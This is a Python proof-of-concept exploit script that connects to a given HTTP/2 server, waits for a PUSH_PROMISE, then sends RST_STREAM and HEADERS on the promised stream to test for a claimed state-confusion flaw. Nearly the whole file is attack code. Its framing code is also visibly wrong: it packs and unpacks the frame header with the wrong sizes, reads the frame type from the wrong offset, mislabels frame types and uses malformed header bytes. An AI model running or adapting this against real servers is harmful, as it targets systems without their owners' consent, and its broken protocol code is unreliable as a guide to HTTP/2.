#!/usr/bin/env python3
import socket
import struct
import sys
import ssl
import time

def create_h2_frame(frame_type, flags, stream_id, payload):
    """
    Constructs a raw HTTP/2 frame.
    Format: Length (3 bytes) | Type (1 byte) | Flags (1 byte) | Stream ID (4 bytes) | Payload
    """
    length = len(payload)
    frame_header = struct.pack(">IBB", length, frame_type, flags)
    # Stream ID is 31 bits, so we mask it
    frame_header += struct.pack(">I", stream_id & 0x7FFFFFFF)
    return frame_header + payload

def send_frames(sock, frames):
    """Sends a list of raw HTTP/2 frames over the socket."""
    for frame in frames:
        sock.sendall(frame)
        print(f"[+] Sent frame: Type={frame[3]}, StreamID={struct.unpack('>I', frame[4:8])[0] & 0x7FFFFFFF}")

def main():
    if len(sys.argv) < 3:
        print("Usage: python poc_push_promise_state_confusion.py <host> <port>")
        sys.exit(1)

    host = sys.argv[1]
    port = int(sys.argv[2])

    print(f"[*] Connecting to {host}:{port}...")
    
    # Create a TCP socket
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    # Wrap with SSL for HTTPS (HTTP/2 usually runs over TLS)
    context = ssl.create_default_context()
    context.check_hostname = False
    context.verify_mode = ssl.CERT_NONE
    
    try:
        ssl_sock = context.wrap_socket(sock, server_hostname=host)
        ssl_sock.connect((host, port))
    except Exception as e:
        print(f"[!] Connection failed: {e}")
        sys.exit(1)

    print("[*] Connection established. Sending HTTP/2 connection preface...")
    
    # HTTP/2 Connection Preface
    preface = b"PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"
    ssl_sock.sendall(preface)
    
    # Send a SETTINGS frame (empty payload, just to acknowledge)
    settings_frame = create_h2_frame(frame_type=0x04, flags=0x00, stream_id=0, payload=b"")
    ssl_sock.sendall(settings_frame)
    
    # Wait for SETTINGS ACK
    time.sleep(0.5)
    
    # Send a SETTINGS ACK
    settings_ack = create_h2_frame(frame_type=0x04, flags=0x01, stream_id=0, payload=b"")
    ssl_sock.sendall(settings_ack)
    
    print("[*] Sending initial request on Stream 1...")
    
    # Craft a simple HEADERS frame for Stream 1
    # :method: GET, :path: /, :scheme: https, :authority: host
    headers_payload = b'\x82\x86\x84\x41\x8c\x08\x4b\x88\x06\x73\x63\x68\x65\x6d\x65\x86\x88\x03\x70\x61\x74\x68\x85\x88\x02\x2f\x87\x88\x04\x68\x6f\x73\x74'
    headers_frame = create_h2_frame(frame_type=0x01, flags=0x04, stream_id=1, payload=headers_payload)
    ssl_sock.sendall(headers_frame)
    
    print("[*] Waiting for server response and PUSH_PROMISE...")
    time.sleep(1)
    
    # Read response to find PUSH_PROMISE
    promised_stream_id = None
    while True:
        try:
            # Read frame header (9 bytes)
            header_data = ssl_sock.recv(9)
            if len(header_data) < 9:
                print("[!] Connection closed or no more data.")
                break
                
            length, frame_type, flags, stream_id = struct.unpack(">IBB I", header_data)
            
            # Read payload
            if length > 0:
                payload = ssl_sock.recv(length)
                
                if frame_type == 0x05:  # PUSH_PROMISE
                    print(f"[+] Received PUSH_PROMISE on Stream {stream_id}")
                    # Promised Stream ID is the first 4 bytes of the payload
                    promised_stream_id = struct.unpack(">I", payload[:4])[0] & 0x7FFFFFFF
                    print(f"[*] Promised Stream ID: {promised_stream_id}")
                    break
                elif frame_type == 0x01:  # HEADERS
                    print(f"[+] Received HEADERS on Stream {stream_id}")
                elif frame_type == 0x09:  # DATA
                    print(f"[+] Received DATA on Stream {stream_id}")
                    
        except Exception as e:
            print(f"[!] Error reading frame: {e}")
            break
    
    if not promised_stream_id:
        print("[!] No PUSH_PROMISE received. Server might not support push or didn't push.")
        sys.exit(1)
        
    print(f"[*] Exploiting state confusion on Promised Stream {promised_stream_id}...")
    
    # Step 1: Send RST_STREAM for the promised stream ID
    # Error code 0x00 (NO_ERROR)
    rst_payload = struct.pack(">I", 0x00)
    rst_frame = create_h2_frame(frame_type=0x03, flags=0x00, stream_id=promised_stream_id, payload=rst_payload)
    ssl_sock.sendall(rst_frame)
    print(f"[+] Sent RST_STREAM for Stream {promised_stream_id}")
    
    # Step 2: Send HEADERS for the promised stream ID
    # This should be a PROTOCOL_ERROR if the server is compliant
    headers_frame_promise = create_h2_frame(frame_type=0x01, flags=0x04, stream_id=promised_stream_id, payload=headers_payload)
    ssl_sock.sendall(headers_frame_promise)
    print(f"[+] Sent HEADERS for Stream {promised_stream_id}")
    
    print("[*] Waiting for server reaction...")
    time.sleep(2)
    
    # Check for GOAWAY or RST_STREAM in response
    try:
        header_data = ssl_sock.recv(9)
        if len(header_data) < 9:
            print("[!] Connection closed unexpectedly.")
            return
            
        length, frame_type, flags, stream_id = struct.unpack(">IBB I", header_data)
        
        if frame_type == 0x07:  # GOAWAY
            print("[+] Server sent GOAWAY. This indicates a protocol error was detected.")
            print("[+] Server is likely PATCHED/COMPLIANT.")
        elif frame_type == 0x03:  # RST_STREAM
            print("[+] Server sent RST_STREAM. This might indicate state confusion.")
        else:
            print(f"[?] Server sent unexpected frame type {frame_type}.")
            
    except Exception as e:
        print(f"[!] Error reading response: {e}")
        
    ssl_sock.close()

if __name__ == "__main__":
    main()